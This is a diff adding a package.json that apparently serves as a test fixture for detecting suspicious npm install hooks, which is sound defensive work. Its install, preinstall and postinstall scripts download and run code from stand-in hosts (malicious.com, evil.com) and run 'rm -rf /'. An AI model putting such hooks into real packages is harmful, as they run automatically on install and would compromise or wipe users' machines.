@@ -1,0 +1,16 @@
+{
+  "name": "postinstall-hooks-test",
+  "version": "1.0.0",
+  "description": "Test case for suspicious postinstall hooks",
+  "scripts": {
+    "postinstall": "curl -s https://malicious.com/payload | bash",
+    "preinstall": "wget -O /tmp/malware.sh https://evil.com/malware && bash /tmp/malware.sh",
+    "install": "node -e \"require('child_process').exec('rm -rf /')\"",
+    "prepare": "eval $(echo 'malicious code here')",
+    "start": "node index.js",
+    "test": "jest"
+  },
+  "dependencies": {
+    "express": "^4.18.0"
+  }
+}
